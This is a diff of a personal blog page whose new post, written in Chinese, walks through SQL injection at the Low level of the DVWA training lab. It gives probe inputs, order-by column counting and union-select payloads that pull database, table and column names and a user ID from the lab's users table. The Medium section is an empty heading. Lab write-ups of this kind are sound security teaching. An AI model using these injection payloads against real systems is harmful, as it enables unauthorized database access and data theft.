@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>DVWA | LoveCtrl-Tan</title>
+<title>SQL injection | LoveCtrl-Tan</title>
 <meta name="description" content="温故而知新">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -92,27 +92,44 @@
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">DVWA</h2>
-            <div class="post-date">2019-10-19</div>
+            <h2 class="post-title">SQL injection</h2>
+            <div class="post-date">2019-10-25</div>
             
             <div class="post-content">
-              <ul>
-<li><a href="https://lovectrl-tan.github.io/post/file-upload/">File Upload</a></li>
-<li><a href="https://lovectrl-tan.github.io/post/csrf/">CSRF</a></li>
-<li><a href="https://lovectrl-tan.github.io/post/sql-injection/">SQL Injection</a></li>
-</ul>
+              <h1 id="low">Low</h1>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025163347.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025163626.png" alt=""><br>
+接下来我们来判断是否存在注入点</p>
+<!-- more -->
+<p>当我们分别输入<code>1'</code> <code>1' and 1=1#</code> <code>1' and 1=2#</code>时<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025163708.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025163724.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025163735.png" alt=""><br>
+初步判断可能具有注入点，接着我们用<code>order by</code>语句来查询字段字段数<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025164204.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025164217.png" alt=""><br>
+字段数为<code>3</code>,接着我们用<code>union select</code>联合查询语句来爆数据库名，表名和字段名<br>
+首先是数据库名，使用以下语句</p>
+<pre><code>1' union select 1,database()#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025164439.png" alt=""><br>
+接着是表名，使用以下语句</p>
+<pre><code>1' union select 1,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1)#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025164652.png" alt=""><br>
+然后是字段名，使用以下语句</p>
+<pre><code>1' union select 1,(select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025164749.png" alt=""><br>
+接下来我们就可以查询数据啦，我们构造以下语句来查询第一个用户ID</p>
+<pre><code>1' union select 1,(select user_id from dvwa.users limit 0,1)#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025164952.png" alt=""><br>
+重复操作我就不一一阐述</p>
+<h1 id="medium">Medium</h1>
 
             </div>
             
-            
-              <div class="next-post">
-                <div class="next">下一篇</div>
-                <a href="https://lovectrl-tan.github.io/post/sql-labs">
-                  <h3 class="post-title">
-                    SQL-LABS
-                  </h3>
-                </a>
-              </div>
             
 
             
